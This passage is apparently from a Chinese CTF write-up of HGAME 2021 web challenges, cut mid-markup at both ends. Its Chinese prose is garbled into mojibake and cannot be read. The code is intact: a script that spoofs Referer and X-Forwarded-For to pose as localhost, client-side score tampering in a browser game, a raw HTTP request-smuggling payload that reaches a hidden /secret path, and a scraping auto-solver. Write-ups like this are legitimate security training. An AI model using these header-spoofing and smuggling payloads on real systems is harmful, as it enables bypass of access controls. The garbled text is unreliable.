loading="lazy"><p>è¿™é‡Œåªè¦æ”¹UAå°±è¡Œäº†ï¼ŒUser-Agent ç®€å•æ¥è¯´å°±æ˜¯å‘Šè¯‰æœåŠ¡å™¨è®¿é—®è€…æ˜¯é€šè¿‡ä»€ä¹ˆå·¥å…·æ¥è¯·æ±‚çš„ï¼Œæ·»åŠ <code>Infinite Improbability Drive</code>æˆ–è€…ç›´æ¥åˆ æ‰UAåªåŠ è¿™ä¸ªä¹Ÿå¯ä»¥</p><p>éšåæç¤º</p><pre class="language-none"><code class="language-none">ä½ çŸ¥é“å—ï¼Ÿ&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;github.com&#x2F;wuhan005&quot;&gt;èŒ„å­&lt;&#x2F;a&gt;ç‰¹åˆ«è¦æ±‚ï¼šä½ å¾—ä»ä»–çš„&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;cardinal.ink&#x2F;&quot;&gt;Cardinal&lt;&#x2F;a&gt;è¿‡æ¥</code></pre><img src="/article/hgame2021/image-20210206152624452.png" class="" title="image-20210206152624452" loading="lazy"><p>è¿™é‡Œæ˜¯è¦æ”¹Refererï¼Œç®€å•æ¥è¯´å°±æ˜¯å‘Šè¯‰æœåŠ¡å™¨è¯¥ç½‘é¡µæ˜¯ä»å“ªä¸ªé¡µé¢é“¾æ¥è¿‡æ¥çš„ï¼ŒæœåŠ¡å™¨å› æ­¤å¯ä»¥è·å¾—ä¸€äº›ä¿¡æ¯ç”¨äºå¤„ç†ï¼Œç”¨æ³•ä¸€èˆ¬æ˜¯ä¸ºäº†é˜²å¤–è¿æ¥ï¼Œç›´æ¥ç”¨<code>&lt;a href=&quot;&quot;&gt;</code>ï¼Œ<code>ç”¨Submitæˆ–&lt;input type=&quot;image&quot;&gt;æäº¤çš„è¡¨å•(POSTæˆ–GET)</code>ï¼Œæˆ–è€…<code>ä½¿ç”¨JavaScriptæäº¤çš„[è¡¨å•](https://baike.baidu.com/item/è¡¨å•)(POSTæˆ–GET)</code>éƒ½æ˜¯ä¼šå¸¦ä¸ŠRefererï¼Œå½“ç„¶ä¼ªé€ ä¹Ÿå¾ˆç®€å•ã€‚</p><p>æœ€åæç¤º<code>flagä»…èƒ½é€šè¿‡æœ¬åœ°è®¿é—®è·å¾—</code></p><img src="/article/hgame2021/image-20210206153338355.png" class="" title="image-20210206153338355" loading="lazy"><p>å¾ˆç®€å•çš„XFFï¼ŒXFFå°±æ˜¯è¡¨ç¤ºå®¢æˆ·ç«¯æœ€åŸå§‹çš„IPåœ°å€ï¼Œä¹Ÿæ˜¯å¾ˆå®¹æ˜“ä¼ªé€ </p><img src="/article/hgame2021/image-20210206153608572.png" class="" title="image-20210206153608572" loading="lazy"><p>pythonè„šæœ¬å¦‚ä¸‹</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ï¼š 2021/2/6 15:57@Auth ï¼š gyy@Blog ï¼šhttp://err0r.top"""</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://hitchhiker42.0727.site:42420/HitchhikerGuide.php"</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"User-Agent"</span> <span class="token punctuation">:</span> <span class="token string">"Infinite Improbability Drive"</span><span class="token punctuation">,</span>    <span class="token string">"Referer"</span> <span class="token punctuation">:</span> <span class="token string">"https://cardinal.ink/"</span><span class="token punctuation">,</span>    <span class="token string">"X-Forwarded-For"</span> <span class="token punctuation">:</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">&#125;</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers <span class="token operator">=</span> headers<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span></code></pre><p>çœ‹ç€ç›´è§‚ç‚¹</p><hr><h3 id="watermelon"><a href="#watermelon" class="headerlink" title="watermelon"></a>watermelon</h3><p>é¢˜ç›®æè¿°ï¼š ç®€å•ä¸”ä¸Šå¤´çš„æ¸¸æˆ </p><p>é¢˜ç›®åœ°å€ ï¼š <a href="http://watermelon.ryen.xyz:800/">http://watermelon.ryen.xyz:800/</a> </p><p>ç´§è·Ÿæ½®æµçš„å°æ¸¸æˆï¼Œä½œè€…æŠŠæºç å…¬å¼€äº†ï¼Œæ‰€ä»¥æœ‰å¾ˆå¤šäºŒåˆ›ã€‚æŠ¢äº†ä¸ªä¸€è¡€</p><img src="/article/hgame2021/first.png" class="" title="first" loading="lazy"><p>æ‰‹å¿«2333</p><img src="/article/hgame2021/image-20210206153657660.png" class="" title="image-20210206153657660" loading="lazy"><p>çœ‹åˆ°å°æ¸¸æˆé¢˜ï¼Œç¬¬ä¸€çœ¼çœ‹jsï¼Œgithubæœä¸€åœˆäº†è§£åˆ°è¿™ä¸ªæ¸¸æˆçš„æºç åœ¨./src/project.jsã€‚ä½†æ˜¯ä»£ç å››åƒè¡Œï¼Œå› ä¸ºæ¸¸æˆå¼€æºï¼Œæ‰€ä»¥å¾ˆå®¹æ˜“èƒ½æ‰¾åˆ°åˆ†æçš„æºç èµ„æ–™ï¼Œ<a href="https://www.cnblogs.com/xuanyu-10-18/p/14340204.html">å‚è€ƒé“¾æ¥</a>ï¼Œç›´æ¥æœåˆ°æ§åˆ¶åˆ†æ•°çš„ä»£ç ï¼Œæ”¹æ‰</p><img src="/article/hgame2021/image-20210206155153207.png" class="" title="image-20210206155153207" loading="lazy"><p>å¯ä»¥çœ‹åˆ°è¿™ä¸€å—3436è¡Œ<code>default.score</code>æ˜¯è®¡åˆ†å—ï¼Œæ”¹æˆ+999999ä¿å­˜ï¼Œç„¶åæŠŠæ¸¸æˆç©ç»“æŸå¼¹flag</p><img src="/article/hgame2021/image-20210206155459828.png" class="" title="image-20210206155459828" loading="lazy"><hr><h3 id="å®è—èµ°ç§è€…"><a href="#å®è—èµ°ç§è€…" class="headerlink" title="å®è—èµ°ç§è€…"></a>å®è—èµ°ç§è€…</h3><p>é¢˜ç›®æè¿°ï¼š </p><p><strong>èµ„æ–™ï¼š<a href="https://paper.seebug.org/1048/">https://paper.seebug.org/1048/</a></strong><br>å®è—èµ°ç§è€… Switch å–œæ¬¢å·ç›—å¹¶å°†å¥‡ç‰¹çš„å®è—èµ°ç§åˆ°ä¸€äº›é»‘å¸‚å•†å®¶æ‰‹ä¸­ã€‚<br>ä¸ºäº†é˜»æ­¢å…¶ç»§ç»­ä½œæ¶ï¼Œè­¦æ¢ Liki å¥‰å‘½å°† Switch æŠ“æ•å½’æ¡ˆã€‚<br>è°ƒæŸ¥è¿‡ç¨‹ä¸­ï¼ŒLiki å‘ç° Switch å°†ä¸€ä¸ªç§˜å¯†è—åœ¨äº†ä¸€ä¸ªç§äººæœåŠ¡å™¨ä¸­ã€‚<br>è¿™æˆ–è®¸ä¼šæˆä¸ºåç»­è¿½æŸ¥ Switch çš„é‡å¤§çº¿ç´¢ï¼Œä½ èƒ½æ‰¾åˆ°è¿™ä¸ªç§˜å¯†å—ï¼Ÿ </p><p>é¢˜ç›®é“¾æ¥ï¼š <a href="http://thief.0727.site/">http://thief.0727.site:80</a> </p><p><strong>hint: æ³¨æ„ç•™æ„æœåŠ¡å™¨ä¿¡æ¯</strong> </p><p>HTTPè¯·æ±‚èµ°ç§ï¼Œèµ„æ–™é‡Œè®²çš„å¾ˆè¯¦ç»†ï¼Œå»ºè®®ä»”ç»†è¯»ä¸€ä¸‹ï¼Œè¿™é‡Œä¸åšè¿‡å¤šé˜è¿°</p><p>payloadï¼š</p><pre class="language-none"><code class="language-none">GET &#x2F; HTTP&#x2F;1.1Host: thief.0727.sitePragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;88.0.4324.104 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Content-Length: 95Transfer-Encoding: chunked0GET &#x2F;secret HTTP&#x2F;1.1Content-Length: 30Host: thief.0727.siteClient-IP: 127.0.0.11</code></pre><img src="/article/hgame2021/image-20210206161847925.png" class="" title="image-20210206161847925" loading="lazy"><hr><h3 id="æ™ºå•†æ£€æµ‹é¸¡"><a href="#æ™ºå•†æ£€æµ‹é¸¡" class="headerlink" title="æ™ºå•†æ£€æµ‹é¸¡"></a>æ™ºå•†æ£€æµ‹é¸¡</h3><p>é¢˜ç›®æè¿°ï¼š åˆæœ‰è°ä¸çˆ±é«˜æ•°å‘¢ï¼Ÿåæ­£æˆ‘ä¸çˆ±ï¼ˆè¯·ä½¿ç”¨firefoxæµè§ˆå™¨æ‰“å¼€é¢˜ç›®ï¼‰ </p><p>é¢˜ç›®åœ°å€ï¼š <a href="http://r4u.top:5000/">http://r4u.top:5000/</a> </p><p>åˆåˆ°äº†å†™è„šæœ¬ç¯èŠ‚ï¼Œé¦–å…ˆçœ‹ä¸‹é¢˜ç›®</p><img src="/article/hgame2021/image-20210206162112398.png" class="" title="image-20210206162112398" loading="lazy"><p>æˆ‘å¤§æ¦‚æ˜¯å‡çš„å¤§å­¦ç”Ÿ</p><p>å…ˆæ‰¾é¢˜ç›®ï¼Œå…¨æ˜¯ax+bçš„å½¢å¼ï¼Œé‚£å°±æŒºå¥½åŠçš„ï¼Œæ‰¾æºç çœ‹çœ‹æ€ä¹ˆå–æ•°å­—</p><img src="/article/hgame2021/image-20210206162233545.png" class="" title="image-20210206162233545" loading="lazy"><p>åº”è¯¥è¿˜æ˜¯æŒºå¥½å–çš„ï¼Œä½†æ˜¯å¼€å§‹å†™è„šæœ¬å‘ç°GETè¯·æ±‚ä¸åˆ°ï¼Œåº”è¯¥æ˜¯å¯¹æ¥apiçš„ï¼Œæœç„¶åœ¨Sourcesé‡Œé¢æ‰¾åˆ°äº†ä¸ª<code>fuckmath.js</code></p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">getStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        type<span class="token operator">:</span><span class="token string">"GET"</span><span class="token punctuation">,</span>        url<span class="token operator">:</span> <span class="token string">"/api/getStatus"</span><span class="token punctuation">,</span>        dataType<span class="token operator">:</span><span class="token string">"json"</span><span class="token punctuation">,</span>        <span class="token function-variable function">success</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">let</span> solving <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">'solving'</span><span class="token punctuation">]</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#status"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>solving<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>solving <span class="token operator">===</span> <span class="token number">100</span><span class="token punctuation">)</span>                <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">getQuestion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        type<span class="token operator">:</span> <span class="token string">"GET"</span><span class="token punctuation">,</span>        url<span class="token operator">:</span> <span class="token string">"/api/getQuestion"</span><span class="token punctuation">,</span>        dataType<span class="token operator">:</span> <span class="token string">"json"</span><span class="token punctuation">,</span>        xhrFields<span class="token operator">:</span> <span class="token punctuation">&#123;</span>            withCredentials<span class="token operator">:</span> <span class="token boolean">true</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        crossDomain<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token function-variable function">success</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#integral'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'question'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        type<span class="token operator">:</span> <span class="token string">"GET"</span><span class="token punctuation">,</span>        url<span class="token operator">:</span> <span class="token string">"/api/getFlag"</span><span class="token punctuation">,</span>        dataType<span class="token operator">:</span> <span class="token string">"json"</span><span class="token punctuation">,</span>        <span class="token function-variable function">success</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">getQuestion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    type<span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>    url<span class="token operator">:</span> <span class="token string">"/api/verify"</span><span class="token punctuation">,</span>    data<span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>answer<span class="token operator">:</span><span class="token function">parseFloat</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#answer'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    dataType<span class="token operator">:</span> <span class="token string">"json"</span><span class="token punctuation">,</span>    contentType<span class="token operator">:</span> <span class="token string">"application/json;charset=utf-8"</span><span class="token punctuation">,</span>    xhrFields<span class="token operator">:</span> <span class="token punctuation">&#123;</span>        withCredentials<span class="token operator">:</span> <span class="token boolean">true</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    crossDomain<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'result'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#alert'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">                &lt;div class="alert alert-success">\n                    &lt;strong>Right!&lt;/strong>\n                &lt;/div></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#alert'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">                &lt;div class="alert alert-danger">\n                    &lt;strong>Wrong!&lt;/strong>\n                &lt;/div></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>åº”è¯¥æ˜¯é€šè¿‡<code>./api/getStatus</code>æ£€æŸ¥åšé¢˜æƒ…å†µï¼Œ<code>./api/getQuestion</code>åŠ è½½é¢˜ç›®ï¼Œ<code>./api/verify</code>äº¤ç­”æ¡ˆï¼Œæœ€å<code>./api/getFlag</code>æ‹¿flag</p><p>ç›´æ¥è®¿é—®<code>./api/getFlag</code>çœ‹çœ‹ï¼Ÿ</p><img src="/article/hgame2021/image-20210206162746009.png" class="" title="image-20210206162746009" loading="lazy"><p>è¢«éª‚äº†555â€¦åº”è¯¥æ˜¯æ£€æŸ¥sessionçœ‹åšé¢˜æƒ…å†µï¼Œå…¶ä»–éƒ½è®¿é—®ä¸€ä¸‹çœ‹çœ‹</p><img src="/article/hgame2021/image-20210206162926231.png" class="" title="image-20210206162926231" loading="lazy"><img src="/article/hgame2021/image-20210206162952785.png" class="" title="image-20210206162952785" loading="lazy"><p>æœ€åç¡®è®¤ç­”æ¡ˆæ˜¯<code>answer</code>ï¼Œå¼€å§‹å†™è„šæœ¬</p><img src="/article/hgame2021/image-20210206163154279.png" class="" title="image-20210206163154279" loading="lazy"><p>èµ¶æ—¶é—´ï¼Œæ²¡ææ­£åˆ™ï¼Œå‡‘åˆç€ç”¨ç”¨å§ï¼Œè¹©è„šç¼–ç¨‹å‹¿å–·2333</p><p>payload:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ï¼š 2021/1/30 21:20@Auth ï¼š gyy@Blog ï¼šhttp://err0r.top"""</span><span class="token keyword">import</span> requests<span class="token keyword">from</span> sympy <span class="token keyword">import</span> symbols<span class="token punctuation">,</span> integrate<span class="token keyword">import</span> jsonurl <span class="token operator">=</span> <span class="token string">"http://r4u.top:5000"</span><span class="token comment"># print(requests.get(url))</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">jifen</span><span class="token punctuation">(</span>shangxian<span class="token punctuation">,</span> xiaxian<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    x <span class="token operator">=</span> symbols<span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">)</span>    A <span class="token operator">=</span> integrate<span class="token punctuation">(</span>a <span class="token operator">*</span> x <span class="token operator">+</span> b<span class="token punctuation">,</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> xiaxian<span class="token punctuation">,</span> shangxian<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> A<span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> data <span class="token operator">==</span> <span class="token string">"get"</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span>            <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>            <span class="token string">'utf8'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&#123;"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&#125;"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\"question\":\"&lt;math>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/math>\"&#125;"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/json"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>            <span class="token string">'utf8'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"/api/getQuestion"</span><span class="token punctuation">,</span> <span class="token string">"get"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;mrow>"</span><span class="token punctuation">)</span>    <span class="token comment"># print(res)</span>    xiaxian <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>        res<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mn>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mn>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mrow>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># print(xiaxian)</span>    shangxian <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>        res<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;/msubsup>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mn>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mn>"</span><span class="token punctuation">,</span>                                                                                                           <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>            <span class="token string">"&lt;/mrow>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># print(shangxian)</span>    a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>        res<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"("</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mn>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mn>"</span><span class="token punctuation">,</span>                                                                                                                <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>            <span class="token string">"&lt;/mrow>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mi>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># print(a)</span>    b <span class="token operator">=</span> <span class="token builtin">float</span><span class="token punctuation">(</span>        res<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"+"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">")"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mn>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mn>"</span><span class="token punctuation">,</span>                                                                                                                <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>            <span class="token string">"&lt;/mrow>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># print(b)</span>    ans <span class="token operator">=</span> jifen<span class="token punctuation">(</span>shangxian<span class="token punctuation">,</span> xiaxian<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"answer"</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>    upans <span class="token operator">=</span> req<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"/api/verify"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>upans<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token 